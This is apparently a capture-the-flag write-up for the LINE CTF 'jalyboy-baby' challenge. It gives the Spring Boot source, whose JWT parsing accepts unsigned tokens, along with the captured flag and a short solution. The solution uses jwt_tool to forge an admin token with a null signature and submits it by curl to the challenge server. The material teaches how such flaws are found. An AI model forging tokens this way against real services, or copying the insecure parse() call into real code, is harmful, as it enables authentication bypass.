# jalyboy-baby

## Source Code

<details><summary>file tree</summary>

```console
$ unzip -t jalyboy-baby_7a1dfa2b72cd021aa085071bc93efada.zip
Archive:  jalyboy-baby_7a1dfa2b72cd021aa085071bc93efada.zip
    testing: jalyboy-baby/            OK
    testing: jalyboy-baby/Dockerfile   OK
    testing: jalyboy-baby/README.md   OK
    testing: jalyboy-baby/gradle/     OK
    testing: jalyboy-baby/gradle/wrapper/   OK
    testing: jalyboy-baby/gradle/wrapper/gradle-wrapper.jar   OK
    testing: jalyboy-baby/gradle/wrapper/gradle-wrapper.properties   OK
    testing: jalyboy-baby/gradlew     OK
    testing: jalyboy-baby/.dockerignore   OK
    testing: jalyboy-baby/.gitignore   OK
    testing: jalyboy-baby/build.gradle   OK
    testing: jalyboy-baby/docker-compose.yml   OK
    testing: jalyboy-baby/gradle-wrapper.properties   OK
    testing: jalyboy-baby/gradlew.bat   OK
    testing: jalyboy-baby/settings.gradle   OK
    testing: jalyboy-baby/src/        OK
    testing: jalyboy-baby/src/main/   OK
    testing: jalyboy-baby/src/main/resources/   OK
    testing: jalyboy-baby/src/main/resources/templates/   OK
    testing: jalyboy-baby/src/main/resources/templates/index.ftlh   OK
    testing: jalyboy-baby/src/main/resources/application.properties   OK
    testing: jalyboy-baby/src/main/java/   OK
    testing: jalyboy-baby/src/main/java/me/   OK
    testing: jalyboy-baby/src/main/java/me/linectf/   OK
    testing: jalyboy-baby/src/main/java/me/linectf/jalyboy/   OK
    testing: jalyboy-baby/src/main/java/me/linectf/jalyboy/JwtController.java   OK
    testing: jalyboy-baby/src/main/java/me/linectf/jalyboy/JwtApplication.java   OK
No errors detected in compressed data of jalyboy-baby_7a1dfa2b72cd021aa085071bc93efada.zip.
```

</details>

<details><summary>JwtController.java</summary>

```java
package me.linectf.jalyboy;

import io.jsonwebtoken.*;
import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestParam;
import io.jsonwebtoken.Jwts;
import io.jsonwebtoken.security.Keys;

import java.security.Key;
import java.security.KeyPair;

@Controller
public class JwtController {

    public static final String ADMIN = "admin";
    public static final String GUEST = "guest";
    public static final String UNKNOWN = "unknown";
    public static final String FLAG = System.getenv("FLAG");
    Key secretKey = Keys.secretKeyFor(SignatureAlgorithm.HS256);

    @GetMapping("/")
    public String index(@RequestParam(required = false) String j, Model model) {
        System.out.println(secretKey);
        String sub = UNKNOWN;
        String jwt_guest = Jwts.builder().setSubject(GUEST).signWith(secretKey).compact();

        try {
            Jwt jwt = Jwts.parser().setSigningKey(secretKey).parse(j);
            Claims claims = (Claims) jwt.getBody();
            if (claims.getSubject().equals(ADMIN)) {
                sub = ADMIN;
            } else if (claims.getSubject().equals(GUEST)) {
                sub = GUEST;
            }
        } catch (Exception e) {
//            e.printStackTrace();
        }

        model.addAttribute("jwt", jwt_guest);
        model.addAttribute("sub", sub);
        if (sub.equals(ADMIN)) model.addAttribute("flag", FLAG);

        return "index";
    }
}
```

</details>

<details><summary>build.gradle</summary>

```gradle
plugins {
    id 'java'
    id 'org.springframework.boot' version '3.1.5'
    id 'io.spring.dependency-management' version '1.1.3'
}

group = 'me.linectf'
version = '0.0.1-SNAPSHOT'

java {
    sourceCompatibility = '17'
}

configurations {
    compileOnly {
        extendsFrom annotationProcessor
    }
}

repositories {
    mavenCentral()
}

dependencies {
    implementation 'org.springframework.boot:spring-boot-starter-freemarker'
    implementation 'org.springframework.boot:spring-boot-starter-web'
    annotationProcessor 'org.springframework.boot:spring-boot-configuration-processor'
    testImplementation 'org.springframework.boot:spring-boot-starter-test'
    implementation 'io.jsonwebtoken:jjwt-api:0.11.2'
    runtimeOnly 'io.jsonwebtoken:jjwt-impl:0.11.2',
            // Uncomment the next line if you want to use RSASSA-PSS (PS256, PS384, PS512) algorithms:
            //'org.bouncycastle:bcprov-jdk15on:1.60',
            'io.jsonwebtoken:jjwt-jackson:0.11.2' // or 'io.jsonwebtoken:jjwt-gson:0.11.2' for gson
}

tasks.named('test') {
    useJUnitPlatform()
}
```

</details>

## Flag

LINECTF{337e737f9f2594a02c5c752373212ef7}

## Solution

JWT null signature

```bash
JWT='eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJndWVzdCJ9.RFzqFkmqaQcDqqK65innj_DL2S5BJGxs1rn7a86xtYk'
python3 ~/tools/jwt_tool/jwt_tool.py $JWT -I -pc sub -pv 'admin' -X n
# outout => eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhZG1pbiJ9.
curl -s http://34.84.28.50:10000/?j=eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhZG1pbiJ9. | grep -o 'LINECTF{.*}'
# output => LINECTF{337e737f9f2594a02c5c752373212ef7}
```
